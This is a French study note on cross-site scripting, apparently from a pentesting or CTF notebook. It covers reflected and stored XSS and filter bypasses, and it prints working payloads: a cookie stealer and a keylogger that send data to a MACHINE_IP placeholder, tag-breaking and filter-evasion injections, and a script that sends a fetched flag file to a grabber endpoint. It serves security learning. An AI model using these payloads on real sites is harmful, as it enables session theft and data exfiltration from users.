Les failles XSS sont des **failles** qui se passe **côté client**, elles consistent à éxécuter des **scripts javascript** sur la page d'une victime.

## __Payload__

Télécharger l'extension [Hack tool](https://github.com/LasCC/Hack-Tools) pour disposer de plusieurs payload à utiliser facilement.
### Proof Of Concept

```html
<script>alert("XSS");</script>
```

Ce code affichera "XSS" à l'écran si une faille XSS existe.
### Session Stealing

```html
<script>fetch('MACHINE_IP?cookie=' + btoa(document.cookie));</script>
```

Ce code enverra les cookies de la victime à l'adresse de la machine.
### Key Logger

```html
<script>document.onkeypress=function(e){fetch('http://MACHINE_IP/log?key='+btoa(e.key));}</script>
```

Ce code enverra, à chaque fois que la victime appuyera sur une touche, la valeur de la touche à l'adresse de la machine.
## __Reflected XSS__

Une reflected XSS est présente lorsque la page affiche une valeur passé en *paramètre dans l'URL*.
Example :

![[reflectedXss1.png]]

En remplaçant la valeur de *error* par un script, on peut obtenir ceci :

![[reflectedXss2.png]]

Voici un schéma qui illustre ce qui se passera quand nous enverrons ce lien à une victime :

![[reflectedXss3.png]]
## __Stored XSS__

Lorsqu'un script XSS est *stocké dans une base de donnée* on appelle cela une Stored XSS. Cela peut se produire lors de la création d'un compte, ou d'un poste sur un forum par example.
Cela aura pour action que lorsqu'un client accedera à cette page, cela chargera le script XSS et l'executera.
## __Perfecting the Payload__

### 1er cas

![[perfectingPayload1.1.png]]

![[perfectingPayload1.2.png]]

Dans ce scénario on peut bypass la balise \<**input**\> en écrivant:

```html
"><script>alert('XSS');</script>
```
Avec *">* on va **fermer** la balise \<**input**\> avant d'écrire notre script.

### 2e cas

Parfois le rendu de notre payload peut ressembler à ca :

![[perfectingPayload2.png]]

Le problème est dû au fait que le serveur à retiré le mot *script*, pour bypass cela il suffit d'écrire le mot clé autour du mot supprimé.

```html
<sscriptcript>alert("XSS");</sscriptcript>
```

Une fois le texte enlevé par le filtre le code ressemblera à ca :

```html
<script>alert("XSS");</script>
```

### 3e cas

Dans le cas ou nous voulions insérer un **payload à la place de l'url d'une image**, on pourrai se retrouver dans cette situation :

![[perfectingPayload3.1.png]]

Dans ce cas le code de bypass ressemblerai à ça :

```html
/images/cat.jpg" onload="alert('XSS');
```

![[perfectingPayload3.2.png]]

## __Usage__
You can use an XSS to fetch a page and get the content of it:
```js
<script>fetch('http://10.10.23.210:8080/flag.txt').then(r=>r.text()).then(t=>document.location='http://localhost/XSS/grabber.php?c='+t)</script>
```
